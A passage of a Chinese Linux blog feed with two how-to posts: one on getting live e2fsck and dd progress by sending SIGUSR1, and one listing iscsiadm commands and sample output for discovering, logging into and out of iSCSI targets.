    <content type="html"><![CDATA[<h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><h4 id="&#x5BF9;&#x4E8E;e2fsck-&#x800C;&#x8A00;&#xFF0C;&#x6709;&#x4E24;&#x4E2A;&#x7279;&#x70B9;&#xFF0C;&#x5982;&#x679C;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x662F;&#x5065;&#x5EB7;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x5F88;&#x5FEB;&#x5B8C;&#x6210;&#xFF0C;3&#x79D2;&#x4E4B;&#x5185;&#x89E3;&#x51B3;&#x6218;&#x6597;&#xFF0C;&#x4F46;&#x662F;&#x786E;&#x5B9E;&#x5B58;&#x5728;error&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x53EF;&#x80FD;&#x8017;&#x65F6;&#x975E;&#x5E38;&#x4E45;&#xFF0C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8FDB;&#x5EA6;&#x6C47;&#x62A5;&#x662F;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x9700;&#x8981;&#x4FEE;&#x590D;&#x51E0;&#x4E2A;&#x5C0F;&#x65F6;&#xFF0C;&#x53C8;&#x6CA1;&#x6709;&#x8FDB;&#x5EA6;&#x6C47;&#x62A5;&#xFF0C;&#x4EBA;&#x4F1A;&#x6293;&#x72C2;&#x7684;&#x3002;"><a href="#&#x5BF9;&#x4E8E;e2fsck-&#x800C;&#x8A00;&#xFF0C;&#x6709;&#x4E24;&#x4E2A;&#x7279;&#x70B9;&#xFF0C;&#x5982;&#x679C;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x662F;&#x5065;&#x5EB7;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x5F88;&#x5FEB;&#x5B8C;&#x6210;&#xFF0C;3&#x79D2;&#x4E4B;&#x5185;&#x89E3;&#x51B3;&#x6218;&#x6597;&#xFF0C;&#x4F46;&#x662F;&#x786E;&#x5B9E;&#x5B58;&#x5728;error&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x53EF;&#x80FD;&#x8017;&#x65F6;&#x975E;&#x5E38;&#x4E45;&#xFF0C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8FDB;&#x5EA6;&#x6C47;&#x62A5;&#x662F;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x9700;&#x8981;&#x4FEE;&#x590D;&#x51E0;&#x4E2A;&#x5C0F;&#x65F6;&#xFF0C;&#x53C8;&#x6CA1;&#x6709;&#x8FDB;&#x5EA6;&#x6C47;&#x62A5;&#xFF0C;&#x4EBA;&#x4F1A;&#x6293;&#x72C2;&#x7684;&#x3002;" class="headerlink" title="&#x5BF9;&#x4E8E;e2fsck &#x800C;&#x8A00;&#xFF0C;&#x6709;&#x4E24;&#x4E2A;&#x7279;&#x70B9;&#xFF0C;&#x5982;&#x679C;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x662F;&#x5065;&#x5EB7;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x5F88;&#x5FEB;&#x5B8C;&#x6210;&#xFF0C;3&#x79D2;&#x4E4B;&#x5185;&#x89E3;&#x51B3;&#x6218;&#x6597;&#xFF0C;&#x4F46;&#x662F;&#x786E;&#x5B9E;&#x5B58;&#x5728;error&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x53EF;&#x80FD;&#x8017;&#x65F6;&#x975E;&#x5E38;&#x4E45;&#xFF0C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8FDB;&#x5EA6;&#x6C47;&#x62A5;&#x662F;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x9700;&#x8981;&#x4FEE;&#x590D;&#x51E0;&#x4E2A;&#x5C0F;&#x65F6;&#xFF0C;&#x53C8;&#x6CA1;&#x6709;&#x8FDB;&#x5EA6;&#x6C47;&#x62A5;&#xFF0C;&#x4EBA;&#x4F1A;&#x6293;&#x72C2;&#x7684;&#x3002;"></a>&#x5BF9;&#x4E8E;e2fsck &#x800C;&#x8A00;&#xFF0C;&#x6709;&#x4E24;&#x4E2A;&#x7279;&#x70B9;&#xFF0C;&#x5982;&#x679C;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x662F;&#x5065;&#x5EB7;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x5F88;&#x5FEB;&#x5B8C;&#x6210;&#xFF0C;3&#x79D2;&#x4E4B;&#x5185;&#x89E3;&#x51B3;&#x6218;&#x6597;&#xFF0C;&#x4F46;&#x662F;&#x786E;&#x5B9E;&#x5B58;&#x5728;error&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x53EF;&#x80FD;&#x8017;&#x65F6;&#x975E;&#x5E38;&#x4E45;&#xFF0C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8FDB;&#x5EA6;&#x6C47;&#x62A5;&#x662F;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x9700;&#x8981;&#x4FEE;&#x590D;&#x51E0;&#x4E2A;&#x5C0F;&#x65F6;&#xFF0C;&#x53C8;&#x6CA1;&#x6709;&#x8FDB;&#x5EA6;&#x6C47;&#x62A5;&#xFF0C;&#x4EBA;&#x4F1A;&#x6293;&#x72C2;&#x7684;&#x3002;</h4><h2 id="&#x5B9E;&#x65F6;&#x68C0;&#x67E5;-e2fsck-&#x8FDB;&#x5EA6;&#x7684;&#x65B9;&#x6CD5;"><a href="#&#x5B9E;&#x65F6;&#x68C0;&#x67E5;-e2fsck-&#x8FDB;&#x5EA6;&#x7684;&#x65B9;&#x6CD5;" class="headerlink" title="&#x5B9E;&#x65F6;&#x68C0;&#x67E5; e2fsck &#x8FDB;&#x5EA6;&#x7684;&#x65B9;&#x6CD5;"></a>&#x5B9E;&#x65F6;&#x68C0;&#x67E5; e2fsck &#x8FDB;&#x5EA6;&#x7684;&#x65B9;&#x6CD5;</h2><p>&#x5728;e2fsck &#x8FDB;&#x884C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5728;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x7EC8;&#x7AEF;&#x5411;e2fsck &#x8FDB;&#x7A0B;&#x53D1;&#x9001;SIGUSR1&#x4FE1;&#x53F7;&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch -n 5 <span class="built_in">kill</span> -10 `pidof e2fsck`</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;e2fsck&#x8C03;&#x7528;&#x7684;&#x7EC8;&#x7AEF;&#x4E0A;&#xFF0C;&#x5C31;&#x4F1A;&#x6BCF;5&#x79D2;&#x949F;&#x663E;&#x793A;&#x4E00;&#x4E0B;&#x5B9E;&#x65F6;&#x7684;&#x8FDB;&#x5EA6;&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">e2fsck 1.42 (29-Nov-2011)</span><br><span class="line">/dev/dm-19 contains a file system with errors, check forced.</span><br><span class="line">Pass 1: Checking inodes, blocks, and sizes</span><br><span class="line">Pass 2: Checking directory structure                                           </span><br><span class="line">Pass 3: Checking directory connectivity                                        </span><br><span class="line">Pass 4: Checking reference counts                                              </span><br><span class="line">Pass 5: Checking group summary information                                     </span><br><span class="line">/dev/dm-19: |======================================================  \ 95.8%</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x7ED3;&#x675F;&#x8BED;"><a href="#&#x7ED3;&#x675F;&#x8BED;" class="headerlink" title="&#x7ED3;&#x675F;&#x8BED;"></a>&#x7ED3;&#x675F;&#x8BED;</h2><p>&#x5E76;&#x975E;&#x53EA;&#x6709;e2fsck &#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x4F1A;&#x54CD;&#x5E94;SIGUSR1&#x4FE1;&#x53F7;&#xFF0C;dd&#x5DE5;&#x5177;&#x4E5F;&#x6709;&#x540C;&#x6837;&#x7684;&#x7279;&#x70B9;&#x3002;dd &#x62F7;&#x8D1D;&#x5927;&#x6587;&#x4EF6;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53EA;&#x6709;&#x5728;&#x62F7;&#x8D1D;&#x7ED3;&#x675F;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x624D;&#x4F1A;&#x6C47;&#x62A5;&#x65F6;&#x95F4;&#x4EE5;&#x53CA;&#x901F;&#x5EA6;&#x7B49;&#x4FE1;&#x606F;&#xFF0C;&#x4F46;&#x662F;&#x50CF;&#x6211;&#x8FD9;&#x79CD;&#x7B49;&#x5F85;&#x7126;&#x8651;&#x7EFC;&#x5408;&#x75C7;&#x7684;&#x9009;&#x624B;&#xFF0C;&#x4E00;&#x5B9A;&#x662F;&#x4F1A;&#x6293;&#x72C2;&#x7684;&#xFF0C;&#x540C;&#x6837;&#x9053;&#x7406;&#xFF0C;&#x901A;&#x8FC7;&#x5B9E;&#x65F6;&#x5411;dd&#x8FDB;&#x7A0B;&#x53D1;&#x9001; SIGUSR1&#x4FE1;&#x53F7;&#xFF0C;dd&#x8FDB;&#x7A0B;&#x5C31;&#x4F1A;&#x65F6;&#x65F6;&#x6C47;&#x62A5;&#x901F;&#x7387;&#x4FE1;&#x606F;&#xFF0C;&#x4E0D;&#x59A8;&#x8BD5;&#x8BD5;&#xFF0C;&#x5F88;&#x6709;&#x7528;&#x3002;</p><p>&#x5BF9;&#x4E8E;&#x5F00;&#x53D1;&#x5404;&#x79CD;&#x5DE5;&#x5177;&#x7684;&#x4EBA;&#x6765;&#x8BF4;&#xFF0C;&#x5982;&#x679C;&#x5DE5;&#x5177;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x53EF;&#x80FD;&#x5F88;&#x4E45;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6CE8;&#x518C;SIGUSR1&#x4FE1;&#x53F7;&#x7684;&#x5904;&#x7406;&#x51FD;&#x6570;&#xFF0C;&#x5B9E;&#x65F6;&#x5411;&#x7528;&#x6237;&#x6C47;&#x62A5;&#x8FDB;&#x5EA6;&#xFF0C;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x4E0D;&#x9519;&#x7684;&#x4E60;&#x60EF;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;a href=&quot;#&amp;#x524D;&amp;#x8A00;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;/a&gt;&amp;#x524D;&amp;#x8A00;&lt;/h2&gt;&lt;h4 id=&quot;&amp;#x5BF9;&amp;
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>iSCSI_command</title>
    <link href="https://jiemin.wang/2019/03/11/iSCSI-command/"/>
    <id>https://jiemin.wang/2019/03/11/iSCSI-command/</id>
    <published>2019-03-11T13:21:34.000Z</published>
    <updated>2019-03-11T13:26:58.665Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><h4 id="iSCSI&#x5BA2;&#x6237;&#x7AEF;&#x5E38;&#x7528;&#x547D;&#x4EE4;&#x603B;&#x662F;&#x5FD8;&#x8BB0;&#xFF0C;&#x5728;&#x6B64;&#x5904;&#x8BB0;&#x5F55;&#x4E0B;&#x3002;"><a href="#iSCSI&#x5BA2;&#x6237;&#x7AEF;&#x5E38;&#x7528;&#x547D;&#x4EE4;&#x603B;&#x662F;&#x5FD8;&#x8BB0;&#xFF0C;&#x5728;&#x6B64;&#x5904;&#x8BB0;&#x5F55;&#x4E0B;&#x3002;" class="headerlink" title="iSCSI&#x5BA2;&#x6237;&#x7AEF;&#x5E38;&#x7528;&#x547D;&#x4EE4;&#x603B;&#x662F;&#x5FD8;&#x8BB0;&#xFF0C;&#x5728;&#x6B64;&#x5904;&#x8BB0;&#x5F55;&#x4E0B;&#x3002;"></a>iSCSI&#x5BA2;&#x6237;&#x7AEF;&#x5E38;&#x7528;&#x547D;&#x4EE4;&#x603B;&#x662F;&#x5FD8;&#x8BB0;&#xFF0C;&#x5728;&#x6B64;&#x5904;&#x8BB0;&#x5F55;&#x4E0B;&#x3002;</h4><h2 id="&#x5E38;&#x7528;&#x547D;&#x4EE4;"><a href="#&#x5E38;&#x7528;&#x547D;&#x4EE4;" class="headerlink" title="&#x5E38;&#x7528;&#x547D;&#x4EE4;"></a>&#x5E38;&#x7528;&#x547D;&#x4EE4;</h2><h4 id="&#x67E5;&#x770B;&#x5F53;&#x524D;session"><a href="#&#x67E5;&#x770B;&#x5F53;&#x524D;session" class="headerlink" title="&#x67E5;&#x770B;&#x5F53;&#x524D;session"></a>&#x67E5;&#x770B;&#x5F53;&#x524D;session</h4><h4 id="&#x6302;&#x8F7D;&#x4E4B;&#x524D;&#xFF0C;&#x4E00;&#x822C;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;"><a href="#&#x6302;&#x8F7D;&#x4E4B;&#x524D;&#xFF0C;&#x4E00;&#x822C;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;" class="headerlink" title="&#x6302;&#x8F7D;&#x4E4B;&#x524D;&#xFF0C;&#x4E00;&#x822C;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;"></a>&#x6302;&#x8F7D;&#x4E4B;&#x524D;&#xFF0C;&#x4E00;&#x822C;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@node:~<span class="comment"># iscsiadm -m session </span></span><br><span class="line">iscsiadm: No active sessions.</span><br></pre></td></tr></tbody></table></figure><p>&#x6302;&#x8F7D;&#x4E4B;&#x540E;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">root@node-242:~<span class="comment"># iscsiadm -m session </span></span><br><span class="line">tcp: [2] 10.16.172.247:3260,1 iqn.2018-11.com:BEAN</span><br><span class="line"></span><br><span class="line">root@node-242:~<span class="comment"># iscsiadm -m session -P 3</span></span><br><span class="line">iSCSI Transport Class version 2.0-870</span><br><span class="line">version 2.0-871</span><br><span class="line">Target: iqn.2018-11.com:BEAN</span><br><span class="line">Current Portal: 10.16.172.247:3260,1</span><br><span class="line">Persistent Portal: 10.16.172.247:3260,1</span><br><span class="line">**********</span><br><span class="line">Interface:</span><br><span class="line">**********</span><br><span class="line">Iface Name: default</span><br><span class="line">Iface Transport: tcp</span><br><span class="line">Iface Initiatorname: iqn.1993-08.org.debian:01:c9c12dd76e</span><br><span class="line">Iface IPaddress: 10.16.172.242</span><br><span class="line">Iface HWaddress: (null)</span><br><span class="line">Iface Netdev: (null)</span><br><span class="line">SID: 2</span><br><span class="line">iSCSI Connection State: LOGGED IN</span><br><span class="line">iSCSI Session State: LOGGED_IN</span><br><span class="line">Internal iscsid Session State: NO CHANGE</span><br><span class="line">************************</span><br><span class="line">Negotiated iSCSI params:</span><br><span class="line">************************</span><br><span class="line">HeaderDigest: None</span><br><span class="line">DataDigest: None</span><br><span class="line">MaxRecvDataSegmentLength: 262144</span><br><span class="line">MaxXmitDataSegmentLength: 1048576</span><br><span class="line">FirstBurstLength: 262144</span><br><span class="line">MaxBurstLength: 1048576</span><br><span class="line">ImmediateData: Yes</span><br><span class="line">InitialR2T: No</span><br><span class="line">MaxOutstandingR2T: 1</span><br><span class="line">************************</span><br><span class="line">Attached SCSI devices:</span><br><span class="line">************************</span><br><span class="line">Host Number: 25State: running</span><br><span class="line">scsi25 Channel 00 Id 0 Lun: 0</span><br><span class="line">Attached scsi disk sdeState: running</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x6839;&#x636E;IP-&#x53D1;&#x73B0;target"><a href="#&#x6839;&#x636E;IP-&#x53D1;&#x73B0;target" class="headerlink" title="&#x6839;&#x636E;IP &#x53D1;&#x73B0;target"></a>&#x6839;&#x636E;IP &#x53D1;&#x73B0;target</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iscsiadm -m discovery -t st -p 10.16.172.246</span><br></pre></td></tr></tbody></table></figure><p>&#x8F93;&#x51FA;&#x5982;&#x4E0B;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@node:~<span class="comment"># iscsiadm -m discovery -t st -p 10.16.172.246</span></span><br><span class="line">10.16.172.246:3260,1 iqn.2018-11.com:BEAN</span><br><span class="line">10.16.172.247:3260,1 iqn.2018-11.com:BEAN</span><br><span class="line">10.16.172.248:3260,1 iqn.2018-11.com:BEAN</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x767B;&#x5F55;&#x5230;&#x6307;&#x5B9A;target"><a href="#&#x767B;&#x5F55;&#x5230;&#x6307;&#x5B9A;target" class="headerlink" title="&#x767B;&#x5F55;&#x5230;&#x6307;&#x5B9A;target"></a>&#x767B;&#x5F55;&#x5230;&#x6307;&#x5B9A;target</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iscsiadm -m node -T [target_name] -p [ip:3260] -l</span><br></pre></td></tr></tbody></table></figure><p>&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iscsiadm -m node -T iqn.2018-11.com:BEAN -p 10.16.172.246:3260 -l</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8F93;&#x51FA;&#x5982;&#x4E0B;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@node:~<span class="comment"># iscsiadm -m node -T iqn.2018-11.com:BEAN -p 10.16.172.246:3260 -l</span></span><br><span class="line">Logging <span class="keyword">in</span> to [iface: default, target: iqn.2018-11.com:BEAN, portal: 10.16.172.246,3260]</span><br><span class="line">Login to [iface: default, target: iqn.2018-11.com:BEAN, portal: 10.16.172.246,3260]: successful</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x767B;&#x5F55;&#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;iscsiadm -m session&#x67E5;&#x770B;&#x3002;&#x7ED3;&#x679C;&#x4E00;&#x822C;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@node-242:~<span class="comment"># iscsiadm -m session </span></span><br><span class="line">tcp: [3] 10.16.172.246:3260,1 iqn.2018-11.com:BEAN</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x767B;&#x51FA;&#x6307;&#x5B9A;target"><a href="#&#x767B;&#x51FA;&#x6307;&#x5B9A;target" class="headerlink" title="&#x767B;&#x51FA;&#x6307;&#x5B9A;target"></a>&#x767B;&#x51FA;&#x6307;&#x5B9A;target</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iscsiadm -m node -T [target_name] -p [ip:3260] -u</span><br></pre></td></tr></tbody></table></figure><p>&#x5177;&#x4F53;&#x6307;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@node:~<span class="comment"># iscsiadm -m node -T iqn.2018-11.com:BEAN -p 10.16.172.246:3260 -u</span></span><br><span class="line">Logging out of session [sid: 3, target: iqn.2018-11.com:BEAN, portal: 10.16.172.246,3260]</span><br><span class="line">Logout of [sid: 3, target: iqn.2018-11.com:BEAN, portal: 10.16.172.246,3260]: successful</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x767B;&#x51FA;&#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;iscsiadm -m session &#x68C0;&#x67E5;&#x6548;&#x679C;&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@node-242:~<span class="comment"># iscsiadm -m session </span></span><br><span class="line">iscsiadm: No active sessions.</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x4FE1;&#x606F;"><a href="#&#x4FE1;&#x606F;" class="headerlink" title="&#x4FE1;&#x606F;"></a>&#x4FE1;&#x606F;</h2><p>&#x4E00;&#x822C;&#x6765;&#x8BB2;&#xFF0C;&#x767B;&#x5F55;target&#x4E4B;&#x540E;&#x4F1A;&#x65B0;&#x589E;&#x4E00;&#x4E2A;&#x76D8;&#x7B26;&#xFF0C;&#x767B;&#x5F55;&#x4E4B;&#x524D;&#xFF0C;lsblk&#x8F93;&#x51FA;&#x5982;&#x4E0B;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@node:~<span class="comment"># lsblk</span></span><br><span class="line">NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT</span><br><span class="line">sda      8:0    0    30G  0 disk </span><br><span class="line">&#x251C;&#x2500;sda1   8:1    0     7M  0 part </span><br><span class="line">&#x251C;&#x2500;sda2   8:2    0  22.2G  0 part /</span><br><span class="line">&#x251C;&#x2500;sda3   8:3    0   7.5G  0 part [SWAP]</span><br><span class="line">&#x2514;&#x2500;sda4   8:4    0   261M  0 part </span><br><span class="line">sdb      8:16   0   100G  0 disk </span><br><span class="line">&#x251C;&#x2500;sdb1   8:17   0     8G  0 part </span><br><span class="line">&#x2514;&#x2500;sdb2   8:18   0    92G  0 part /data/osd.2</span><br><span class="line">sdc      8:32   0     2T  0 disk </span><br><span class="line">sr0     11:0    1  1024M  0 rom</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6267;&#x884C;&#x767B;&#x5F55;target&#x4E4B;&#x540E;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@node:~<span class="comment"># iscsiadm -m node -T iqn.2018-11.com:BEAN -p 10.16.172.246:3260 -l</span></span><br><span class="line">Logging <span class="keyword">in</span> to [iface: default, target: iqn.2018-11.com:BEAN, portal: 10.16.172.246,3260] (multiple)</span><br><span class="line">Login to [iface: default, target: iqn.2018-11.com:BEAN, portal: 10.16.172.246,3260] successful.</span><br><span class="line">root@node2:~<span class="comment"># lsblk</span></span><br><span class="line">NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT</span><br><span class="line">sda      8:0    0    30G  0 disk </span><br><span class="line">&#x251C;&#x2500;sda1   8:1    0     7M  0 part </span><br><span class="line">&#x251C;&#x2500;sda2   8:2    0  22.2G  0 part /</span><br><span class="line">&#x251C;&#x2500;sda3   8:3    0   7.5G  0 part [SWAP]</span><br><span class="line">&#x2514;&#x2500;sda4   8:4    0   261M  0 part </span><br><span class="line">sdb      8:16   0   100G  0 disk </span><br><span class="line">&#x251C;&#x2500;sdb1   8:17   0     8G  0 part </span><br><span class="line">&#x2514;&#x2500;sdb2   8:18   0    92G  0 part /data/osd.2</span><br><span class="line">sdc      8:32   0     2T  0 disk </span><br><span class="line">sr0     11:0    1  1024M  0 rom</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x65B0;&#x589E;&#x4E86;&#x4E00;&#x4E2A;sdc&#x3002;</p><p>&#x5982;&#x679C;&#x786E;&#x5B9A;sdc&#x548C;iSCSI target&#x7684;&#x5173;&#x7CFB;&#x5462;:<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iscsiadm -m session -P 3</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6BD4;&#x5982;&#x4E4B;&#x524D;&#x7684;&#x8F93;&#x51FA;, sde&#x8FD9;&#x5757;&#x78C1;&#x76D8;&#x5373;iSCSI&#xFF0C;&#x6765;&#x81EA; 10.16.172.247:3260&#x7684;Target: iqn.2018-11.com:BEAN<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@node:~<span class="comment"># iscsiadm -m session -P 3</span></span><br><span class="line">iSCSI Transport Class version 2.0-870</span><br><span class="line">version 2.0-871</span><br><span class="line">Target: iqn.2018-11.com:BEAN</span><br><span class="line">Current Portal: 10.16.172.247:3260,1</span><br><span class="line">Persistent Portal: 10.16.172.247:3260,1</span><br><span class="line">**********</span><br><span class="line">Interface:</span><br><span class="line">**********</span><br><span class="line">Iface Name: default</span><br><span class="line">Iface Transport: tcp</span><br><span class="line">Iface Initiatorname: iqn.1993-08.org.debian:01:c9c12dd76e</span><br><span class="line">Iface IPaddress: 10.16.172.242</span><br><span class="line">Iface HWaddress: (null)</span><br><span class="line">Iface Netdev: (null)</span><br><span class="line">SID: 2</span><br><span class="line">iSCSI Connection State: LOGGED IN</span><br><span class="line">iSCSI Session State: LOGGED_IN</span><br><span class="line">Internal iscsid Session State: NO CHANGE</span><br><span class="line">************************</span><br><span class="line">Negotiated iSCSI params:</span><br><span class="line">************************</span><br><span class="line">HeaderDigest: None</span><br><span 